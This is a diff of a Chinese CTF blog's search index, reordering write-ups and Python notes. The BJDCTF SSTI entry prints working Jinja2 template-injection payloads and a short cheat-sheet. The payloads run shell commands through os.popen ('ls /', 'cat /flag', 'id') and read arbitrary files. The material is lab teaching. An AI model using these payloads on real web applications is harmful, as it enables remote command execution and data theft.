@@ -1,6 +1,45 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BJDCTF-2nd-fake-google</title>
+    <url>/2021/04/06/BJDCTF-2nd-fake-google/</url>
+    <content><![CDATA[<h1>0X01 <strong>打开靶机</strong></h1>
+<p><img src="/.io//1.png" alt="1"></p>
+<p>发现无论输入什么字符他都不会过滤（xss除外 ），在输出界面找到ssti注入的提示</p>
+<p><img src="/.io//3.png" alt="3"></p>
+<h1><strong>0X02 直接用ssti日就对了！🤠</strong></h1>
+<ul>
+<li><em>查看根目录</em></li>
+</ul>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/.io//4.png" alt="4"></p>
+<p>ls后台文件出现flag</p>
+<ul>
+<li><em>构造playload，查看flag</em></li>
+</ul>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">P3<span class="string">&#x27;s girlfirend is : flag&#123;4d59689e-7751-4ee4-8daa-f4d8c8de99e2&#125;</span></span><br></pre></td></tr></table></figure>
+<h1><strong>SSTI学习🇭🇺</strong></h1>
+<p>像上面的题目的套路一般直接找playload注入</p>
+<ul>
+<li>
+<h2 id="常用playload">常用playload:</h2>
+</li>
+</ul>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">命令执行：&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">文件操作：&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="萌新入门ssti必看"><em>萌新入门ssti必看</em></h2>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">测试是否存在ssti注入 &#123;&#123;<span class="number">1</span>+<span class="number">1</span>&#125;&#125;  <span class="meta">#回复页面为2说明存在ssti注入</span></span><br><span class="line">查询： &#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__&#125;&#125; </span><br><span class="line">查看可用模块： &#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()&#125;&#125; </span><br><span class="line">查找危险函数： &#123;&#123;().__class__.base__.__subclasses__().index(warnings.catch_warnings)&#125;&#125;</span><br><span class="line"></span><br><span class="line">相关函数解释</span><br><span class="line">__class__ 返回类型所属的对象</span><br><span class="line"></span><br><span class="line">__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line"></span><br><span class="line">__init__ 类的初始化方法</span><br><span class="line"></span><br><span class="line">__globals__ 对包含函数全局变量的字典的引用</span><br><span class="line"></span><br><span class="line">__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line"></span><br><span class="line">__bases__ 返回该对象所继承的基类 __builtins__是做为默认初始模块</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>WEB</tag>
+        <tag>CTF</tag>
+        <tag>SSTI注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BJDCTF8086</title>
     <url>/2021/04/19/BJDCTF8086/</url>
     <content><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/12-rOdMS1Lyz0Fc-tGxu5hQ">https://pan.baidu.com/s/12-rOdMS1Lyz0Fc-tGxu5hQ</a><br>
@@ -136,49 +175,6 @@
       </tags>
   </entry>
   <entry>
-    <title>GXYCTF2019 luck_guy</title>
-    <url>/2021/04/08/GXYCTF2019-luck-guy/</url>
-    <content><![CDATA[<blockquote>
-<p>链接：<a href="https://pan.baidu.com/s/1hoU9">https://pan.baidu.com/s/1hoU9</a>         uQsSeGr-6p7RBSm56w<br>
-提取码：ed2z</p>
-</blockquote>
-<h2 id="0x01-查看有无加壳"><strong>0x01 查看有无加壳</strong></h2>
-<p><img src="/.io//1.png" alt="1"></p>
-<p>没有加壳，64位文件</p>
-<h2 id="0x02-打开IDA64，查看main函数，F5反编译"><strong>0x02 打开IDA64，查看main函数，F5反编译</strong></h2>
-<p><img src="/.io//2.png" alt="2"></p>
-<p><img src="/.io//3.png" alt="3"></p>
-<h2 id="0x03-进入patch-me函数，接着进入get-flag函数界面">0x03 进入patch_me函数，接着进入get_flag函数界面</h2>
-<p><img src="/.io//4.png" alt="4"></p>
-<p><img src="/.io//5.png" alt="5"></p>
-<h2 id="0x04-进行代码分析-😞"><strong>0x04 进行代码分析</strong> 😞</h2>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+4h] [bp-3Ch]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [sp+8h] [bp-38h]@7</span></span><br><span class="line">  __int64 s; <span class="comment">// [sp+10h] [bp-30h]@3</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [sp+18h] [bp-28h]@6</span></span><br><span class="line">  __int64 v6; <span class="comment">// [sp+38h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v6 = *MK_FP(__FS__, <span class="number">40LL</span>);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);               <span class="comment">//得到时间</span></span><br><span class="line">  srand(v0);                    <span class="comment">//使用时间作为种子生成随机数字</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( rand() % <span class="number">200</span> )      <span class="comment">// 产生1-199之间的随机数</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);      </span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL); </span><br><span class="line">        <span class="built_in">strcat</span>((<span class="keyword">char</span> *)&amp;s, f1);   <span class="comment">// f1=&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">        <span class="built_in">strcat</span>((<span class="keyword">char</span> *)&amp;s, &amp;f2);  <span class="comment">//f2初始为空</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar not like you&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar want a girlfriend&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        s = <span class="number">9180147350284624745LL</span>;  <span class="comment">//在IDA里面选中9180147350284624745LL按H键转换16进制为0x69,0x63,0x75,0x67,0x60,0x6f,0x66,0x7f    </span></span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;s);  <span class="comment">//f2和s拼接</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> __int64)j &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">31</span>) + (_BYTE)j) &amp; <span class="number">1</span>)</span><br><span class="line">             - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> __int64)j &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">31</span>) == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40LL</span>) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/.io//6.png" alt="6"></p>
-<p>分析可知<strong>flag</strong>是由<strong>f1</strong>和<strong>f2</strong>组成，<strong>f1</strong>已经告诉，现在只需要求<strong>f2</strong>就行。</p>
-<ul>
-<li>
-<p>case4给<strong>f2</strong>赋值</p>
-</li>
-<li>
-<p>case5对<strong>f2</strong>进行处理</p>
-</li>
-</ul>
-<p>swich函数需要排序和，因此顺序是: <strong>case5&gt;case4&gt;case1</strong></p>
-<h2 id="0x05-脚本构建-🍔">0x05 <strong>脚本构建</strong> 🍔</h2>
-<p>由于IDA是反编译C语言，s=0x69,0x63,0x75,0x67,0x60,0x6f,0x66,0x7f应该逆序成s = 0x7F666F6067756369LL作为小端储存，关于大小端推荐师傅的**<a href="https://blog.csdn.net/iteye_21199/article/details/82205638?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4.control">文章</a>**</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">f2 = [<span class="number">0x7F</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x60</span>, <span class="number">0x67</span>, <span class="number">0x75</span>, <span class="number">0x63</span>, <span class="number">0x69</span>][::-<span class="number">1</span>]</span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        s = <span class="built_in">chr</span>(<span class="built_in">int</span>(f2[i]) - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">chr</span>(<span class="built_in">int</span>(f2[i]) - <span class="number">1</span>)</span><br><span class="line">    flag += s</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="/.io//7.png" alt="7"></p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">GXY&#123;do_not_hate_me&#125;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>RE</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>有关逆序的脚本构建</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>GWCTF 2019 pyre</title>
     <url>/2021/04/12/GWCTF-2019-pyre/</url>
     <content><![CDATA[<p>文件链接：<a href="https://pan.baidu.com/s/1J5GGnntQkN8IWD0hKs-X8g">https://pan.baidu.com/s/1J5GGnntQkN8IWD0hKs-X8g</a><br>
@@ -281,32 +277,46 @@ IDA先在sub_40207B()函数执行后一条下断点</p>
       </tags>
   </entry>
   <entry>
-    <title>MRCTF异或</title>
-    <url>/2021/04/22/MRCTF%E5%BC%82%E6%88%96/</url>
-    <content><![CDATA[<h2 id="0x01-使用EP查看文件是否加壳-🔑"><strong>0x01 使用EP查看文件是否加壳</strong>  🔑</h2>
-<p><img src="/.io//2.png" alt="2"></p>
-<p>没有加壳，32位文件</p>
-<hr>
-<h2 id="0x02-使用IDA32位打开文件-📉"><strong>0x02 使用IDA32位打开文件</strong>  📉</h2>
+    <title>GXYCTF2019 luck_guy</title>
+    <url>/2021/04/08/GXYCTF2019-luck-guy/</url>
+    <content><![CDATA[<blockquote>
+<p>链接：<a href="https://pan.baidu.com/s/1hoU9">https://pan.baidu.com/s/1hoU9</a>         uQsSeGr-6p7RBSm56w<br>
+提取码：ed2z</p>
+</blockquote>
+<h2 id="0x01-查看有无加壳"><strong>0x01 查看有无加壳</strong></h2>
 <p><img src="/.io//1.png" alt="1"></p>
-<p><strong><code>Shift</code></strong> + <strong><code>F12</code></strong> 查找关键函数,然后F5反编译</p>
-<p><img src="/.io//8.png" alt="8"></p>
-<p>第十九行可知v0和byte_4212c0进行异或，得到byte_41EA08输出正确</p>
-<p>直接进入byte_41EA08函数查看内容</p>
-<p>得到异或内容</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;MSAWB~FXZ:J:`tQJ\&quot;N@ bpdd&#125;8g&quot;</span></span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="0x03-开始构建异或脚本-​-🔨">0x03 开始构建异或脚本 ​ 🔨</h2>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;MSAWB~FXZ:J:`tQJ\&quot;N@ bpdd&#125;8g&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(i ^<span class="built_in">ord</span>(a[i]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+<p>没有加壳，64位文件</p>
+<h2 id="0x02-打开IDA64，查看main函数，F5反编译"><strong>0x02 打开IDA64，查看main函数，F5反编译</strong></h2>
+<p><img src="/.io//2.png" alt="2"></p>
 <p><img src="/.io//3.png" alt="3"></p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">MRCTF&#123;@_R3@<span class="number">1l</span>y_E2_R3verse!&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-进入patch-me函数，接着进入get-flag函数界面">0x03 进入patch_me函数，接着进入get_flag函数界面</h2>
+<p><img src="/.io//4.png" alt="4"></p>
+<p><img src="/.io//5.png" alt="5"></p>
+<h2 id="0x04-进行代码分析-😞"><strong>0x04 进行代码分析</strong> 😞</h2>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+4h] [bp-3Ch]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [sp+8h] [bp-38h]@7</span></span><br><span class="line">  __int64 s; <span class="comment">// [sp+10h] [bp-30h]@3</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [sp+18h] [bp-28h]@6</span></span><br><span class="line">  __int64 v6; <span class="comment">// [sp+38h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v6 = *MK_FP(__FS__, <span class="number">40LL</span>);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);               <span class="comment">//得到时间</span></span><br><span class="line">  srand(v0);                    <span class="comment">//使用时间作为种子生成随机数字</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( rand() % <span class="number">200</span> )      <span class="comment">// 产生1-199之间的随机数</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);      </span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL); </span><br><span class="line">        <span class="built_in">strcat</span>((<span class="keyword">char</span> *)&amp;s, f1);   <span class="comment">// f1=&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">        <span class="built_in">strcat</span>((<span class="keyword">char</span> *)&amp;s, &amp;f2);  <span class="comment">//f2初始为空</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar not like you&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar want a girlfriend&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        s = <span class="number">9180147350284624745LL</span>;  <span class="comment">//在IDA里面选中9180147350284624745LL按H键转换16进制为0x69,0x63,0x75,0x67,0x60,0x6f,0x66,0x7f    </span></span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;s);  <span class="comment">//f2和s拼接</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> __int64)j &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">31</span>) + (_BYTE)j) &amp; <span class="number">1</span>)</span><br><span class="line">             - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> __int64)j &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">31</span>) == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40LL</span>) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/.io//6.png" alt="6"></p>
+<p>分析可知<strong>flag</strong>是由<strong>f1</strong>和<strong>f2</strong>组成，<strong>f1</strong>已经告诉，现在只需要求<strong>f2</strong>就行。</p>
+<ul>
+<li>
+<p>case4给<strong>f2</strong>赋值</p>
+</li>
+<li>
+<p>case5对<strong>f2</strong>进行处理</p>
+</li>
+</ul>
+<p>swich函数需要排序和，因此顺序是: <strong>case5&gt;case4&gt;case1</strong></p>
+<h2 id="0x05-脚本构建-🍔">0x05 <strong>脚本构建</strong> 🍔</h2>
+<p>由于IDA是反编译C语言，s=0x69,0x63,0x75,0x67,0x60,0x6f,0x66,0x7f应该逆序成s = 0x7F666F6067756369LL作为小端储存，关于大小端推荐师傅的**<a href="https://blog.csdn.net/iteye_21199/article/details/82205638?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4.control">文章</a>**</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">f2 = [<span class="number">0x7F</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x60</span>, <span class="number">0x67</span>, <span class="number">0x75</span>, <span class="number">0x63</span>, <span class="number">0x69</span>][::-<span class="number">1</span>]</span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        s = <span class="built_in">chr</span>(<span class="built_in">int</span>(f2[i]) - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">chr</span>(<span class="built_in">int</span>(f2[i]) - <span class="number">1</span>)</span><br><span class="line">    flag += s</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/.io//7.png" alt="7"></p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">GXY&#123;do_not_hate_me&#125;</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>RE</category>
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>最简单的异或pthon脚本</tag>
+        <tag>有关逆序的脚本构建</tag>
       </tags>
   </entry>
   <entry>
@@ -413,6 +423,35 @@ IDA先在sub_40207B()函数执行后一条下断点</p>
       </tags>
   </entry>
   <entry>
+    <title>MRCTF异或</title>
+    <url>/2021/04/22/MRCTF%E5%BC%82%E6%88%96/</url>
+    <content><![CDATA[<h2 id="0x01-使用EP查看文件是否加壳-🔑"><strong>0x01 使用EP查看文件是否加壳</strong>  🔑</h2>
+<p><img src="/.io//2.png" alt="2"></p>
+<p>没有加壳，32位文件</p>
+<hr>
+<h2 id="0x02-使用IDA32位打开文件-📉"><strong>0x02 使用IDA32位打开文件</strong>  📉</h2>
+<p><img src="/.io//1.png" alt="1"></p>
+<p><strong><code>Shift</code></strong> + <strong><code>F12</code></strong> 查找关键函数,然后F5反编译</p>
+<p><img src="/.io//8.png" alt="8"></p>
+<p>第十九行可知v0和byte_4212c0进行异或，得到byte_41EA08输出正确</p>
+<p>直接进入byte_41EA08函数查看内容</p>
+<p>得到异或内容</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;MSAWB~FXZ:J:`tQJ\&quot;N@ bpdd&#125;8g&quot;</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="0x03-开始构建异或脚本-​-🔨">0x03 开始构建异或脚本 ​ 🔨</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;MSAWB~FXZ:J:`tQJ\&quot;N@ bpdd&#125;8g&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(i ^<span class="built_in">ord</span>(a[i]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+<p><img src="/.io//3.png" alt="3"></p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">MRCTF&#123;@_R3@<span class="number">1l</span>y_E2_R3verse!&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>RE</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>最简单的异或pthon脚本</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>从零开始学习python第三天</title>
     <url>/2021/04/19/python%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9/</url>
     <content><![CDATA[<blockquote>
@@ -480,9 +519,8 @@ IDA先在sub_40207B()函数执行后一条下断点</p>
   </entry>
   <entry>
     <title>test</title>
-    <url>/2021/04/26/test-1/</url>
-    <content><![CDATA[<p><img src="/.io//1-1619437390618.jpg" alt="1"></p>
-<p><img src="/.io//1.jpg" alt="1"></p>
+    <url>/2021/04/29/test/</url>
+    <content><![CDATA[<p><img src="/.io//david-baylis-930-parking.jpg" alt="david-baylis-930-parking"></p>
 ]]></content>
   </entry>
   <entry>
@@ -632,42 +670,53 @@ IDA先在sub_40207B()函数执行后一条下断点</p>
       </tags>
   </entry>
   <entry>
-    <title>BJDCTF-2nd-fake-google</title>
-    <url>/2021/04/06/BJDCTF-2nd-fake-google/</url>
-    <content><![CDATA[<h1>0X01 <strong>打开靶机</strong></h1>
+    <title>从零开始学python第二天</title>
+    <url>/2021/04/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
+    <content><![CDATA[<blockquote>
+<p>从零考试学习python内容 99%来自于python大神 python-jack的<a href="https://zhuanlan.zhihu.com/p/113640664">知乎文章  </a> 再结合本人的实际情况进行学习，严格来说这是JACK老师的内容，只不过再此基础上，我增添了一些我在CTF解题过程中遇到的python脚本实际情况，再次感谢JACK老师</p>
+<p>学习的内容来自：<a href="https://zhuanlan.zhihu.com/p/121188620">https://zhuanlan.zhihu.com/p/121188620</a></p>
+</blockquote>
+<hr>
+<h2 id="for-in循环">for-in循环</h2>
+<p>如果明确的知道循环执行的次数，我们推荐使用<code>for-in</code>循环，例如计算1到100的和。 被<code>for-in</code>循环控制的语句块也是通过缩进的方式来确定的，这一点跟分支结构完全相同，大家看看下面的代码就明白了。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">用for循环实现1~100求和</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Version: 0.1</span></span><br><span class="line"><span class="string">Author: 骆昊</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">total = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">    total += x</span><br><span class="line"><span class="built_in">print</span>(total)</span><br></pre></td></tr></table></figure>
+<p><img src="/.io//0.png" alt="0"></p>
+<p>需要说明的是上面代码中的<code>range(1, 101)</code>可以用来构造一个从1到100的范围，当我们把这样一个范围放到<code>for-in</code>循环中，就可以通过前面的循环变量<code>x</code>依次取出从1到100的整数。当然，<code>range</code>的用法非常灵活，下面给出了一个例子：</p>
+<ul>
+<li><code>range(101)</code>：可以用来产生0到100范围的整数，需要注意的是取不到101。</li>
+<li><code>range(1, 101)</code>：可以用来产生1到100范围的整数，相当于前面是闭区间后面是开区间。</li>
+<li><code>range(1, 101, 2)</code>：可以用来产生1到100的奇数，其中2是步长，即每次数值递增的值。</li>
+<li><code>range(100, 0, -2)</code>：可以用来产生100到1的偶数，其中-2是步长，即每次数字递减的值。</li>
+</ul>
+<p>知道了这一点，我们可以用下面的代码来实现1~100之间的偶数求和。</p>
 <p><img src="/.io//1.png" alt="1"></p>
-<p>发现无论输入什么字符他都不会过滤（xss除外 ），在输出界面找到ssti注入的提示</p>
+<hr>
+<h2 id="while循环">while循环</h2>
+<p>如果要构造不知道具体循环次数的循环结构，我们推荐使用<code>while</code>循环。<code>while</code>循环通过一个能够产生或转换出<code>bool</code>值的表达式来控制循环，表达式的值为<code>True</code>则继续循环；表达式的值为<code>False</code>则结束循环。</p>
